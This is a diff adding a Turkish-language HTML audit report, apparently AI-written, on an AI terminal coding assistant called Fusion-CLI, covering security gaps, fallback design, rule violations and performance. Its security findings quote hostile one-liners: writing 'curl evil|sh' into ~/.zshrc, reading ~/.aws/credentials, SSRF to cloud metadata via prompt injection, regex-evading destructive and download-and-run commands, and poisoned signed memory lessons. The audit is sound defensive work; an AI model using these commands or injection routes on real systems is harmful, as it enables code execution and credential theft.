@@ -1,0 +1,333 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fusion-CLI · Proje Analiz Raporu</title>
+<style>
+  :root{
+    --bg:#fbfbfa; --panel:#ffffff; --ink:#1a1a1a; --muted:#6b6b6b; --line:#ececea;
+    --accent:#3b5bdb; --accent-soft:#eef1fd;
+    --crit:#c1121f; --crit-bg:#fdeceb; --high:#d96a00; --high-bg:#fdf1e5;
+    --mid:#a68200; --mid-bg:#fbf6e3; --low:#5a7a5a; --low-bg:#eef4ee;
+    --ok:#2a7a4b; --ok-bg:#e9f5ee;
+    --mono:ui-monospace,SFMono-Regular,Menlo,monospace;
+    --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif;
+  }
+  @media (prefers-color-scheme:dark){
+    :root{
+      --bg:#16161a; --panel:#1e1e24; --ink:#ececef; --muted:#9a9aa2; --line:#2c2c34;
+      --accent:#8ea2ff; --accent-soft:#23263a;
+      --crit:#ff6b6b; --crit-bg:#2e1a1c; --high:#ffa94d; --high-bg:#2e2318;
+      --mid:#ffd43b; --mid-bg:#2c2814; --low:#9ecfa0; --low-bg:#1c2820;
+      --ok:#6fcf97; --ok-bg:#182a20;
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:#16161a; --panel:#1e1e24; --ink:#ececef; --muted:#9a9aa2; --line:#2c2c34;
+    --accent:#8ea2ff; --accent-soft:#23263a;
+    --crit:#ff6b6b; --crit-bg:#2e1a1c; --high:#ffa94d; --high-bg:#2e2318;
+    --mid:#ffd43b; --mid-bg:#2c2814; --low:#9ecfa0; --low-bg:#1c2820; --ok:#6fcf97; --ok-bg:#182a20;
+  }
+  :root[data-theme="light"]{
+    --bg:#fbfbfa; --panel:#ffffff; --ink:#1a1a1a; --muted:#6b6b6b; --line:#ececea;
+    --accent:#3b5bdb; --accent-soft:#eef1fd;
+    --crit:#c1121f; --crit-bg:#fdeceb; --high:#d96a00; --high-bg:#fdf1e5;
+    --mid:#a68200; --mid-bg:#fbf6e3; --low:#5a7a5a; --low-bg:#eef4ee; --ok:#2a7a4b; --ok-bg:#e9f5ee;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);
+    line-height:1.6;font-size:16px;-webkit-font-smoothing:antialiased}
+  .wrap{max-width:880px;margin:0 auto;padding:0 22px}
+  header{padding:56px 0 34px;border-bottom:1px solid var(--line)}
+  .kicker{font-size:13px;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);font-weight:600}
+  h1{font-size:30px;margin:12px 0 6px;letter-spacing:-.02em}
+  .sub{color:var(--muted);font-size:15px;margin:0}
+  .meta{display:flex;flex-wrap:wrap;gap:18px;margin-top:22px;font-size:13px;color:var(--muted)}
+  .meta b{color:var(--ink);font-weight:600}
+
+  section{padding:38px 0;border-bottom:1px solid var(--line)}
+  h2{font-size:21px;margin:0 0 4px;letter-spacing:-.01em;display:flex;align-items:center;gap:10px}
+  h2 .n{font-family:var(--mono);font-size:13px;color:var(--muted);font-weight:500}
+  .lead{color:var(--muted);margin:2px 0 22px;font-size:15px}
+
+  h3{font-size:16px;margin:26px 0 10px;letter-spacing:-.01em}
+
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:12px;
+    padding:16px 18px;margin:12px 0}
+  .card.crit{border-left:3px solid var(--crit)}
+  .card.high{border-left:3px solid var(--high)}
+  .card.mid{border-left:3px solid var(--mid)}
+  .card.low{border-left:3px solid var(--low)}
+  .card.ok{border-left:3px solid var(--ok)}
+  .card h4{margin:0 0 6px;font-size:15px;display:flex;align-items:center;gap:9px;flex-wrap:wrap}
+  .card p{margin:6px 0;font-size:14.5px;color:var(--ink)}
+  .card p.scn{color:var(--muted);font-size:13.5px}
+  .card p.scn b{color:var(--ink)}
+
+  .tag{font-size:11px;font-weight:700;letter-spacing:.04em;padding:2px 8px;border-radius:20px;
+    text-transform:uppercase;white-space:nowrap}
+  .t-crit{background:var(--crit-bg);color:var(--crit)}
+  .t-high{background:var(--high-bg);color:var(--high)}
+  .t-mid{background:var(--mid-bg);color:var(--mid)}
+  .t-low{background:var(--low-bg);color:var(--low)}
+  .t-ok{background:var(--ok-bg);color:var(--ok)}
+
+  code{font-family:var(--mono);font-size:.85em;background:var(--accent-soft);
+    padding:1px 6px;border-radius:5px;color:var(--ink);word-break:break-word}
+
+  .verdict{display:grid;grid-template-columns:1fr auto;gap:10px 16px;background:var(--panel);
+    border:1px solid var(--line);border-radius:12px;padding:6px 18px;margin:16px 0}
+  .verdict .row{display:contents}
+  .verdict .row>div{padding:11px 0;border-bottom:1px solid var(--line);font-size:14.5px}
+  .verdict .row:last-child>div{border-bottom:none}
+  .verdict .st{text-align:right;font-weight:600;white-space:nowrap}
+
+  .qgrid{display:flex;flex-wrap:wrap;gap:10px;margin:18px 0}
+  .qgrid .q{flex:1 1 150px;background:var(--panel);border:1px solid var(--line);
+    border-radius:12px;padding:14px 16px}
+  .qgrid .q .num{font-size:24px;font-weight:700;letter-spacing:-.02em}
+  .qgrid .q .lbl{font-size:12.5px;color:var(--muted);margin-top:2px}
+  .qgrid .q.gate{border-color:var(--ok);background:var(--ok-bg)}
+
+  ul.clean{margin:10px 0;padding-left:20px}
+  ul.clean li{margin:5px 0;font-size:14.5px}
+  .note{font-size:13px;color:var(--muted);font-style:italic;margin-top:6px}
+
+  .toggle{position:fixed;top:16px;right:16px;background:var(--panel);border:1px solid var(--line);
+    color:var(--muted);border-radius:20px;padding:6px 13px;font-size:12px;cursor:pointer;font-family:var(--sans)}
+  footer{padding:32px 0 56px;color:var(--muted);font-size:13px}
+  a{color:var(--accent)}
+</style>
+</head>
+<body>
+<button class="toggle" onclick="var r=document.documentElement;r.dataset.theme=(r.dataset.theme==='dark'||(!r.dataset.theme&&matchMedia('(prefers-color-scheme:dark)').matches))?'light':'dark'">tema</button>
+
+<header>
+  <div class="wrap">
+    <div class="kicker">Proje Analizi</div>
+    <h1>Fusion-CLI — Derinlemesine Değerlendirme</h1>
+    <p class="sub">Ücretsiz bulut LLM'leriyle (OpenRouter + NVIDIA NIM) çalışan, iki motorlu, öz-öğrenen terminal kodlama asistanı.</p>
+    <div class="meta">
+      <span>Kapsam <b>~12.5k satır kaynak · 112 modül · 40+ test dosyası</b></span>
+      <span>Dal <b>main @ 87556c9</b></span>
+      <span>Kalite kapısı <b style="color:var(--ok)">temiz</b></span>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+
+<!-- GENEL YARGI -->
+<section>
+  <h2>Genel Yargı</h2>
+  <p class="lead">Ürün iddiası kod üzerinde büyük ölçüde <b>gerçekten karşılığını buluyor</b>. Mimari temiz, kalite kapısı üç ayakta da geçiyor, test disiplini yüksek. Kritik açıklar mimaride değil, dış dünyaya bakan araçların sınır kontrollerinde.</p>
+
+  <div class="verdict">
+    <div class="row"><div>İki motor (agent + fusion) implemente mi?</div><div class="st" style="color:var(--ok)">✓ Gerçek</div></div>
+    <div class="row"><div>“Çıktı beğenilmezse yeniden üret” (judge + self-review)</div><div class="st" style="color:var(--ok)">✓ Gerçek</div></div>
+    <div class="row"><div>Öz-öğrenen bellek (performans + ders + kod indeksi)</div><div class="st" style="color:var(--ok)">✓ Gerçek</div></div>
+    <div class="row"><div>“Tier bitince fallback’e düşme”</div><div class="st" style="color:var(--high)">⚠ Nüanslı</div></div>
+    <div class="row"><div>Kalite kapısı (ruff + mypy strict + pytest)</div><div class="st" style="color:var(--ok)">✓ Temiz</div></div>
+    <div class="row"><div>Dosya / web araçlarında güvenlik sınırı</div><div class="st" style="color:var(--crit)">✕ Boşluk</div></div>
+  </div>
+
+  <div class="qgrid">
+    <div class="q gate"><div class="num" style="color:var(--ok)">0</div><div class="lbl">ruff + mypy(strict) + pytest hatası</div></div>
+    <div class="q"><div class="num" style="color:var(--crit)">2</div><div class="lbl">Kritik güvenlik açığı</div></div>
+    <div class="q"><div class="num" style="color:var(--high)">5</div><div class="lbl">Yüksek öncelikli bulgu</div></div>
+    <div class="q"><div class="num">0</div><div class="lbl">Kaynakta TODO / FIXME / stub</div></div>
+  </div>
+</section>
+
+<!-- GÜVENLİK -->
+<section>
+  <h2><span class="n">01</span> Güvenlik Açıkları</h2>
+  <p class="lead">Tasarım düşünülmüş (merkezi tehlike listesi, sabit-zamanlı imza, bellek öncesi sır taraması). Ama dışa bakan araçlarda sınır kontrolü eksik.</p>
+
+  <div class="card crit">
+    <h4><span class="tag t-crit">Kritik</span> Dosya araçlarında proje kökü dışına yazma/okuma koruması yok</h4>
+    <p><code>tools/files.py:21-24</code> — <code>resolve_path</code> mutlak yolları olduğu gibi kabul eder; <code>resolve()</code> + kök-altında doğrulaması yok. <code>../../</code> traversal ve kök-içi symlink de engellenmez. <code>safety.py:56</code> dosya yazmayı tehlike kontrolünden bilinçli muaf tutuyor.</p>
+    <p class="scn"><b>Senaryo:</b> LLM <code>write_file(path="~/.zshrc", content="curl evil|sh")</code> çağırır; <code>auto</code> modunda dosya yazma yıkıcı sayılmadığı için onay istenmez → sonraki kabuk oturumunda kalıcı RCE. <code>read_file</code> ile <code>~/.aws/credentials</code>, <code>.env</code> okunabilir.</p>
+  </div>
+
+  <div class="card high">
+    <h4><span class="tag t-high">Yüksek</span> Web aracında SSRF koruması yok</h4>
+    <p><code>tools/web.py:37-49</code> — URL doğrulanmıyor, <code>follow_redirects=True</code>. <code>127.0.0.1</code>, <code>169.254.169.254</code> (bulut metadata), <code>[::1]</code> engellenmiyor; dış URL 302 ile localhost’a yönlendirebilir. <code>web_fetch</code> değiştirici olmadığı için onaya da girmez.</p>
+    <p class="scn"><b>Senaryo:</b> Prompt injection ile <code>web_fetch("http://169.254.169.254/latest/meta-data/iam/...")</code> → bulutta IAM kimlik bilgileri model bağlamına sızar.</p>
+  </div>
+
+  <div class="card high">
+    <h4><span class="tag t-high">Yüksek</span> Tehlikeli komut tespiti regex tabanlı — baypas edilebilir</h4>
+    <p><code>tools/shell.py:28</code> <code>subprocess.run(shell=True)</code> + <code>safety.py</code> regex listesi. Yakalanmayanlar: <code>python -c "import shutil;shutil.rmtree('/')"</code>, <code>find . -delete</code>, <code>rm -r -f</code> (ayrık), <code>&gt; dosya</code>, <code>echo…|base64 -d|sh</code>, <code>bash &lt;(curl…)</code>. <code>shell=True</code> ile <code>;</code>/<code>&amp;&amp;</code>/<code>$()</code> zincirlemesi serbest.</p>
+    <p class="scn"><b>Senaryo:</b> Manipüle çıktı <code>os.system</code>’lı bir <code>python -c</code> üretir; desende yok → <code>danger_reason=None</code> → <code>auto</code> modda sorulmadan çalışır.</p>
+  </div>
+
+  <div class="card high">
+    <h4><span class="tag t-high">Yüksek</span> Redaction log / trace / JSONL çıktısına uygulanmıyor</h4>
+    <p><code>core/redaction.py</code> yalnızca ders belleği (<code>learning.py:132</code>) ve knowledge (<code>validation.py:43</code>) yollarında çağrılıyor. <code>observability/json_sink.py:28</code> her olayın tüm alanlarını (<code>ToolExecuted.args/output</code>) redaksiyonsuz yazar. <code>litellm_provider.py:105</code> ham istisna metni (URL/header içerebilir) kullanıcıya/loglara akar.</p>
+  </div>
+
+  <div class="card high">
+    <h4><span class="tag t-high">Yüksek</span> Knowledge imzası: koda gömülü simetrik anahtar</h4>
+    <p><code>knowledge/signing.py:17</code> — <code>DEFAULT_INTEGRITY_KEY</code> kaynakta açık ve HMAC simetrik; doğrulama = imzalama anahtarı. Herkes geçerli imza üretebilir. Kripto uygulaması sağlam (<code>compare_digest</code>), sorun <b>güven modeli</b>. Ed25519 gibi asimetrik imzaya taşınmalı.</p>
+    <p class="scn"><b>Senaryo:</b> Ortak knowledge deposuna yazabilen biri kötü niyetli “ders”i gömülü anahtarla imzalar; <code>sync</code>’te geçerli sayılır, belleğe girer, sonraki turları etkiler (dolaylı injection kalıcılığı).</p>
+  </div>
+
+  <div class="card mid">
+    <h4><span class="tag t-mid">Orta</span> Model çıktısı doğrulanmadan komut/yol olarak kullanılıyor</h4>
+    <p>Sistemde veri/talimat ayrımı yok; en yumuşak halka regex tehlike listesi. Playbook otomasyonu da (<code>loop.py:458</code> <code>_all_commands_safe</code>) aynı zayıf sezgisele dayanıyor. <code>git</code> aracında boş <code>subcommand</code> → <code>IndexError</code> (<code>shell.py:48</code>).</p>
+  </div>
+
+  <div class="card ok">
+    <h4><span class="tag t-ok">Doğru</span> Onay katmanı tasarımı sağlam</h4>
+    <p><code>AutoApproval</code> yıkıcı komutta yine sorar; <code>SecurityApproval</code> pre-allow’u yıkıcıya uygulatmaz; <code>PlanApproval</code> her şeyi bloklar; etkileşimsiz ortamda sessiz “evet” yok. Zayıflık katmanda değil, onu besleyen <code>danger_reason</code>’ın gücünde.</p>
+  </div>
+</section>
+
+<!-- FALLBACK -->
+<section>
+  <h2><span class="n">02</span> Fallback &amp; Yarım Bırakılan Noktalar</h2>
+  <p class="lead">Zincir <b>yarım değil, tam</b> — ama beklenenden farklı çalışıyor. Kaynakta stub yok; ertelenen işler disiplinli biçimde <code>docs/BACKLOG.md</code>’de.</p>
+
+  <div class="card high">
+    <h4><span class="tag t-high">Nüans</span> “Tier bitince düşme” değil — paralel yarıştırma (hedging)</h4>
+    <p><code>providers/hedged.py:43-57</code> — birincil + tüm fallback modelleri <code>asyncio.create_task</code> ile <b>aynı anda</b> başlar, ilk <code>ok=True</code> kazanır, kalanlar iptal. Yani sıralı bir failover yok; hepsi baştan yarışır (gecikme = min, toplam değil). Docstring bunu dürüstçe belgeliyor.</p>
+    <p class="scn"><b>Sonuç:</b> Her istek 2-3 modele aynı anda gider → <b>ücretsiz tier rate-limit’i daha hızlı tüketilebilir</b>. Kullanıcıya “tier tükenince sonrakine geçer” diye anlatmak teknik olarak yanlış; “aynı anda yarıştırır, ilk başarılıyı alır” doğru ifade.</p>
+  </div>
+
+  <div class="card ok">
+    <h4><span class="tag t-ok">Sağlam</span> İki katmanlı 429 dayanıklılığı</h4>
+    <p>Model içi: <code>litellm num_retries</code> (<code>defaults.yaml:32</code>) 429/5xx’i yeniden dener, exception değil <code>ok=False</code> döner. Modeller arası: bir model 429 alırsa hedging paralel çalışan diğerinin başarısını kullanır. Hiçbiri başaramazsa birleşik <code>ok=False</code> sonuç (<code>_all_failed</code>).</p>
+  </div>
+
+  <div class="card ok">
+    <h4><span class="tag t-ok">Sağlam</span> Fusion + agent iyileştirme döngüleri tam</h4>
+    <p><b>Fusion</b> (<code>engines/fusion/engine.py</code>): paralel adaylar → hakem ‖ sentez (paralel) → hakem düşerse sezgisel kazanan. Tek aday varsa hakem hiç çağrılmaz. <b>Agent</b> (<code>engines/agent/loop.py</code>): reflexion (araç hatasında yön) + otomatik devam (1 kez) + öz-eleştiri (denetçi model, tek düzeltici tur, sonsuz döngü yok).</p>
+  </div>
+
+  <h3>Bilinçli olarak ertelenmiş / izlenen (BACKLOG.md)</h3>
+  <ul class="clean">
+    <li><b>nemotron-3-super token çorbası:</b> yüksek bağlamda bozuk çıktı; öz-denetim kurtarıyor ama ham çöp düzeltmeden önce ekranda görünüyor (agent modu canlı akıtır, öz-denetim tur sonrası çalışır — <i>çözülmemiş mimari gerilim</i>).</li>
+    <li><b>Hakem eksik puanlama:</b> üç adaydan bazen ikisine puan verir (tur bozulmaz, tablo eksik görünür) — kabul edilmiş.</li>
+    <li><b>web_search HTML kazımaya dayanıyor;</b> uç değişirse regex güncellenir.</li>
+    <li><b>Fusion modunda streaming kapalı;</b> <code>❯</code> işareti terminal resize’da çoğalabiliyor (prompt_toolkit kök nedeni, temiz çözüm hazır ama uygulanmamış).</li>
+    <li><b>Karar bekleyen:</b> lock dosyası üretilsin mi, kök-dışı yazma kısıtlansın mı, <code>config show</code> tablo görünümü.</li>
+  </ul>
+  <p class="note">Kaynak ağacında tek bir <code>TODO/FIXME/NotImplementedError/pass-only</code> gövde yok — kural (“kod içine TODO yazılmaz, backlog’a düşer”) gerçekten uygulanmış.</p>
+</section>
+
+<!-- RULES -->
+<section>
+  <h2><span class="n">03</span> RULES.md’ye Uymayan Noktalar</h2>
+  <p class="lead">Uyum yüksek: katman sınırları temiz, ters import yok, <code>core</code>’a üçüncü parti sızmamış, bare/geniş except yok, ham <code>print</code> yok, mutable default yok. Tespit edilen ihlaller:</p>
+
+  <div class="card high">
+    <h4><span class="tag t-high">Yüksek</span> Gömülü <code>temperature</code> — magic number + config tutarsızlığı</h4>
+    <p>RULES 113: eşikler koda gömülmez. <code>review.py:64</code>, <code>learning.py:83</code>, <code>compaction.py:48</code> → <code>0.1</code>; <code>fusion/engine.py:220</code>, <code>repl/loop.py:110</code> → <code>0.0</code>. Ana akış <code>runtime.temperature</code> kullanırken bu yollar sabit değer kullanıyor → kullanıcı config’i bu çağrılarda geçersiz. Merkezi sabit veya config’ten gelmeli.</p>
+  </div>
+
+  <div class="card mid">
+    <h4><span class="tag t-mid">Orta</span> 400 satır sınırı aşımı</h4>
+    <p>RULES 10. <code>engines/agent/loop.py</code> <b>558 satır</b>; <code>ui/renderer.py</code> <b>475 satır</b>. Ayrıca <code>run_agent</code> (~66) ve renderer <code>handle</code> (~65) 60 satır fonksiyon sınırının hemen üstünde.</p>
+  </div>
+
+  <div class="card mid">
+    <h4><span class="tag t-mid">Orta</span> Ortam değişkeni <code>config</code> dışında okunuyor / yazılıyor</h4>
+    <p>RULES 40: tüm env erişimi <code>config</code> katmanında. <code>embeddings.py:84</code>, <code>catalog.py:56</code> <code>os.getenv</code>; <code>litellm_provider.py:42-43</code> hem okuyor <b>hem <code>os.environ[...] =</code> ile yazıyor</b>; <code>screen.py:343</code>, <code>repl/loop.py:54</code> feature flag okuyor.</p>
+  </div>
+
+  <div class="card mid">
+    <h4><span class="tag t-mid">Orta</span> <code>time.time()</code> ile Clock enjeksiyonu baypas ediliyor</h4>
+    <p>RULES 41: zaman <code>Clock</code> üzerinden alınır. <code>memory/lessons.py:143</code> ve <code>memory/performance.py:48</code> doğrudan <code>time.time()</code> ile timestamp yazıyor → testte sahte zaman verilemez. (<code>datetime.now</code> hiç yok, yalnız bu iki nokta.)</p>
+  </div>
+
+  <div class="card mid">
+    <h4><span class="tag t-mid">Orta</span> Maliyet hesabında sessiz <code>except</code></h4>
+    <p><code>litellm_provider.py:190</code> — <code>except Exception: return 0.0</code>, log/yorum yok. RULES 121 maliyet takibinin tek yoldan ve güvenilir geçmesini ister; sessiz <code>0.0</code> yanlış maliyet üretebilir.</p>
+  </div>
+
+  <div class="card low">
+    <h4><span class="tag t-low">Düşük</span> <code>Any</code> ve <code>type: ignore</code> gerekçe yorumu eksik</h4>
+    <p>RULES 74/182 gerekçe ister. <code>memory/store.py</code>, <code>lessons.py</code> (<code>_enum</code>), <code>litellm_provider.py</code> (10+), <code>screen.py</code> — çoğu SDK/prompt_toolkit sınırında meşru ama yorumsuz. <code>loader.py:244</code>, <code>screen_spike.py:188</code> <code>type: ignore</code> gerekçesiz. (<code>pyproject.toml</code>’da <code>ANN401</code> istisnaları gerekçelendirilmiş — kod satırında eksik.)</p>
+  </div>
+</section>
+
+<!-- PERFORMANS -->
+<section>
+  <h2><span class="n">04</span> Performans Önerileri</h2>
+  <p class="lead">Eşzamanlılık çekirdeği gerçekten iyi. İki somut kazanç var.</p>
+
+  <div class="card high">
+    <h4><span class="tag t-high">Yüksek kazanç</span> <code>litellm</code> eager import → soğuk açılış ~1.6s yavaş</h4>
+    <p><code>litellm_provider.py:18</code> modül tepesinde <code>import litellm</code> (ölçülen ~1.66s). <code>chromadb</code> doğru şekilde tembel yüklenirken (<code>store.py:44</code>) litellm’e aynı disiplin uygulanmamış. Tembelleştirmek <code>--help</code>/<code>--version</code>/<code>setup</code> gibi LLM’e dokunmayan yolları ~1.6s hızlandırır.</p>
+  </div>
+
+  <div class="card mid">
+    <h4><span class="tag t-mid">Orta</span> Async döngüde bloklayan senkron araç çağrıları</h4>
+    <p><code>shell.subprocess.run</code>, senkron <code>httpx.Client</code> (<code>web.py:40</code>), ChromaDB <code>query()</code> (<code>code_index.py:50</code>, <code>lessons.py:67</code>), dosya I/O — hiçbiri <code>asyncio.to_thread</code> ile sarılmamış. Arka planda dönen ders çıkarımı + model warm-up’ı stall edebilir. <code>registry.execute</code>’ta senkron executor’ları <code>to_thread</code> ile sarmak çözer (proje <code>input.py:124</code>’te bu deseni zaten kullanıyor).</p>
+  </div>
+
+  <div class="card low">
+    <h4><span class="tag t-low">Düşük</span> Lock dosyası yok</h4>
+    <p><code>pyproject.toml</code> bağımlılıkları alt+üst sınırlı (iyi) ama <code>uv.lock</code>/<code>requirements.txt</code> yok — tam tekrarlanabilir kurulum garantisi yok. Uygulama (kütüphane değil) olduğu için gerçek boşluk; <code>uv lock</code> önerilir.</p>
+  </div>
+
+  <h3>Gerçekten iyi yapılmış performans</h3>
+  <ul class="clean">
+    <li><b>Hedging paralel + iptal:</b> ilk başarılı kazanır, kaybedenler <code>_cancel_all</code>/<code>_close_all</code> ile temizlenir; gecikme = min, toplam değil.</li>
+    <li><b>Straggler kesme</b> (<code>concurrency.py</code> <code>gather_with_cutoff</code>): grace + hard-cap + iptal, generic ve ağsız test edilebilir.</li>
+    <li><b>Artımlı reindex:</b> yalnızca değişen parçalar gömülür, batch’li, N+1 yok. ChromaDB istemci önbelleği dizin başına tek+kilitli.</li>
+    <li><b>Hibrit retrieval</b> (BM25 + RRF) reranker modeli olmadan ucuz; NIM soğuk başlangıcı warm-up ile gizli.</li>
+  </ul>
+</section>
+
+<!-- KALİTE / DOĞRU -->
+<section>
+  <h2><span class="n">05</span> Doğru Bulunan Noktalar</h2>
+  <p class="lead">Kullanıcının istediği “doğru yaptığımız” eksen — mühendislik olgunluğu yüksek.</p>
+
+  <div class="card ok">
+    <h4><span class="tag t-ok">Kalite kapısı</span> Üç ayak da temiz</h4>
+    <p><code>ruff check</code> → geçti · <code>mypy src</code> (strict, <code>warn_unreachable</code>) → 112 dosyada sıfır hata · <code>pytest</code> → tüm testler geçti, 0 uyarı. Kapı <code>pyproject.toml</code>’da tek yerde, editöre bırakılmamış.</p>
+  </div>
+
+  <div class="card ok">
+    <h4><span class="tag t-ok">Test</span> Ağsız, izole, gerçekçi suite</h4>
+    <p>Hiçbir test gerçek ağ çağrısı yapmıyor (sağlayıcılar <code>fakes.py</code>/<code>ScriptedProvider</code> ile takas). Kritik yollar kapsanmış: hedging/fallback, cutoff, 22 yıkıcı komut deseni, “allow-list tehlike tespitini baypas etmez” negatif testi, redaction pozitif+negatif. <code>skip</code>/<code>xfail</code>/tautoloji yok.</p>
+    <p class="scn"><b>Küçük not:</b> <code>fakes.py:137</code> ve <code>test_repl.py:515</code> sabit <code>/tmp</code> yolu kullanıyor — <code>tmp_path</code>’e çevrilmeli. <code>test_concurrency</code>/<code>test_hedged</code> gerçek <code>sleep</code> marjına dayanıyor (marj geniş, flake riski düşük ama sanal saat değil).</p>
+  </div>
+
+  <div class="card ok">
+    <h4><span class="tag t-ok">Mimari</span> Katmanlar ve dayanıklılık ayrık</h4>
+    <p>litellm/chromadb sağlayıcı-bellek sınırında hapsedilmiş; dışarı yalnız proje tipleri (<code>ModelResult</code>, <code>Lesson</code>) çıkıyor. Dayanıklılık dekoratör olarak ayrı: yeni sağlayıcı eklemek hedging’i bedava getiriyor. Hatalar exception değil <code>ok=False</code> sonuç nesnesiyle taşınıyor — akış kesilmiyor, model düzeltme şansı buluyor.</p>
+  </div>
+
+  <div class="card ok">
+    <h4><span class="tag t-ok">Disiplin</span> Sır yönetimi + backlog hijyeni</h4>
+    <p>Sırlar belleğe/knowledge’a yazılmadan merkezi redaction gate’inden geçiyor ve testle kilitli. Kaynakta hiç <code>TODO/FIXME</code> yok — ertelenen her iş <code>docs/BACKLOG.md</code>’de gerekçesiyle. Bağımlılıklar alt+üst sınırlı ve gerekçelendirilmiş.</p>
+  </div>
+</section>
+
+<!-- ÖNCELİK -->
+<section>
+  <h2>Önerilen Öncelik Sırası</h2>
+  <div class="verdict">
+    <div class="row"><div><b>1.</b> <code>files.py</code>: <code>resolve()</code> + kök-altı zorunluluğu; write/edit’i onay akışına dahil et</div><div class="st"><span class="tag t-crit">Kritik</span></div></div>
+    <div class="row"><div><b>2.</b> <code>web.py</code>: SSRF denylist (özel IP, metadata, <code>file://</code>) + redirect hedefini doğrula</div><div class="st"><span class="tag t-crit">Kritik</span></div></div>
+    <div class="row"><div><b>3.</b> Redaction’ı JSONL sink + sağlayıcı hata mesajlarına uygula</div><div class="st"><span class="tag t-high">Yüksek</span></div></div>
+    <div class="row"><div><b>4.</b> Knowledge imzasını asimetrik (Ed25519) modele taşı</div><div class="st"><span class="tag t-high">Yüksek</span></div></div>
+    <div class="row"><div><b>5.</b> <code>litellm</code>’i tembel import et — soğuk açılış ~1.6s</div><div class="st"><span class="tag t-high">Yüksek</span></div></div>
+    <div class="row"><div><b>6.</b> Gömülü <code>temperature</code>’ları merkezileştir; env erişimini <code>config</code>’e topla</div><div class="st"><span class="tag t-mid">Orta</span></div></div>
+    <div class="row"><div><b>7.</b> <code>agent/loop.py</code> (558 sat.) böl; senkron araçları <code>to_thread</code>’a al; lock dosyası ekle</div><div class="st"><span class="tag t-mid">Orta</span></div></div>
+  </div>
+  <p class="note">Not: <code>safety.py</code> desen listesi ve sabit değişiklikleri CLAUDE.md gereği kullanıcıyla gerekçesiyle konuşulmalı. Bu belge yalnızca rapordur; hiçbir kod değiştirilmedi.</p>
+</section>
+
+<footer>
+  <div>Fusion-CLI analiz raporu · main @ 87556c9 · yalnızca değerlendirme, kod değişikliği yok.</div>
+</footer>
+
+</div>
+</body>
+</html>
